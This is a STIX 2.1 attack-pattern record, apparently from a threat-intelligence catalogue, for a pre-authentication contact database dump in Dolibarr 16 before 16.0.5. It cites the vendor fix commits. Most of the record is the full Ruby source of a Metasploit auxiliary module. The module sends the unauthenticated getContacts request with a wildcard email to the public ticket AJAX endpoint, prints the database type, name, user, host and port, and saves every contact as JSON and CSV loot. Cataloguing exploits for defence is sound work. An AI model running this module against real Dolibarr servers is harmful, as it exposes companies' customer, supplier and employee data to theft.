{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79d13510-75c4-429e-9c90-e06cd04feb25",
    "created": "2024-08-14T16:30:41.747328Z",
    "modified": "2024-08-14T16:30:41.747332Z",
    "name": "Dolibarr 16 pre-auth contact database dump",
    "description": " Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump. An unauthenticated attacker may retreive a company\u2019s entire customer file, prospects, suppliers and potentially employee information if a contact file exists. Both public and private notes are also included in the dump. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dolibarr_16_contact_dump.rb",
            "external_id": "dolibarr_16_contact_dump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Module::Failure\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Dolibarr 16 pre-auth contact database dump',\n        'Description' => %q{\n          Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.\n          An unauthenticated attacker may retreive a company\u2019s entire customer file, prospects, suppliers,\n          and potentially employee information if a contact file exists.\n          Both public and private notes are also included in the dump.\n        },\n        'Author' => [\n          'Vladimir TOUTAIN', 'Nolan LOSSIGNOL-DRILLIEN'\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2023-03-14',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'References' => [\n          ['URL', 'https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/'],\n          ['URL', 'https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34'],\n          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7'],\n          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']\n        ],\n        'DefaultOptions' => {\n          'HttpClientTimeout' => 20\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])\n      ]\n    )\n  end\n\n  def check_host(_ip)\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    return Exploit::CheckCode::Unknown('Connection failed') unless res\n    return Exploit::CheckCode::Safe unless res.code == 200\n\n    version = res.body.scan(/Dolibarr ([\\d.]+-*[a-zA-Z0-9]*)/).flatten.first\n\n    return Exploit::CheckCode::Detected('Dolibarr version not found - proceeding anyway...') if version.blank?\n\n    if Rex::Version.new(version).between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))\n      return Exploit::CheckCode::Appears(\"Detected vulnerable Dolibarr version: #{version}\")\n    end\n\n    return Exploit::CheckCode::Safe(\"Detected apparently non-vulnerable Dolibarr version: #{version}\")\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/public/ticket/ajax/ajax.php'),\n      'vars_get' => {\n        'action' => 'getContacts',\n        'email' => '%'\n      }\n    }, datastore['HttpClientTimeout'], true)\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response - try increasing HttpClientTimeout\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Exploit response code: #{res.code}\") if res.code != 200\n\n    res_json_document = res.get_json_document\n\n    fail_with(Failure::UnexpectedReply, 'Dolibarr data did not include contacts field') if res_json_document['contacts'].blank?\n\n    contacts = res_json_document['contacts']\n\n    print_good(\"Database type: #{contacts.dig(0, 'db', 'type') || '<not found>'}\")\n    print_good(\"Database name: #{contacts.dig(0, 'db', 'database_name') || '<not found>'}\")\n    print_good(\"Database user: #{contacts.dig(0, 'db', 'database_user') || '<not found>'}\")\n    print_good(\"Database host: #{contacts.dig(0, 'db', 'database_host') || '<not found>'}\")\n    print_good(\"Database port: #{contacts.dig(0, 'db', 'database_port') || '<not found>'}\")\n\n    contact_fields = contacts[0].keys\n    contact_fields.delete('db') # We do not want this in the csv\n\n    nbr_contact = contacts.length\n\n    path_json_file = store_loot(\n      'dolibarr',\n      'application/json',\n      ip,\n      JSON.pretty_generate(res.get_json_document),\n      '.json'\n    )\n\n    print_good(\"Found #{nbr_contact} contacts.\")\n    print_good(\"#{rhost}:#{rport} - File saved in: #{path_json_file}\")\n\n    csv_string = CSV.generate do |csv| # Loop to write into csv\n      csv << contact_fields\n      contacts.each do |contact|\n        csv << contact_fields.map do |element|\n          if contact[element.to_s].is_a?(String) || contact[element.to_s].is_a?(Integer)\n            contact[element.to_s]&.to_s&.strip || ''\n          else\n            ''\n          end\n        end\n      end\n    end\n\n    path_csv_file = store_loot(\n      'dolibarr',\n      'application/csv',\n      ip,\n      csv_string,\n      '.csv'\n    )\n\n    print_good(\"#{rhost}:#{rport} - File saved in: #{path_csv_file}\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-03-14"
}